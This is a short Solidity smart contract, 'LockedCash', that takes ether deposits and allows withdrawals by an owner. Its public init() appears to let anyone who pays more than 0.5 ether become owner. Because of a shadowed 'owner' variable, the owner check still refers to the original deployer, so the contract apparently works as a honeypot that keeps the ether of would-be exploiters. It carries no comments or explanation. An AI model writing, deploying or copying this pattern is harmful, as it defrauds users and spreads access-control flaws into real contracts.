pragma solidity ^0.4.18;

contract Owned {
    address public owner;
    function Owned() { owner = msg.sender; }
    modifier onlyOwner{ if (msg.sender != owner) revert(); _; }
}

contract LockedCash is Owned {
    event CashDeposit(address from, uint amount);
    address public owner = msg.sender;

    function init() payable {
        require(msg.value > 0.5 ether);
        owner = msg.sender;
    }

    function() public payable {
        deposit();
    }

    function deposit() public payable {
        require(msg.value > 0);
        CashDeposit(msg.sender, msg.value);
    }

    function withdraw(uint amount) public onlyOwner {
        require(amount <= this.balance);
        msg.sender.transfer(amount);
    }
}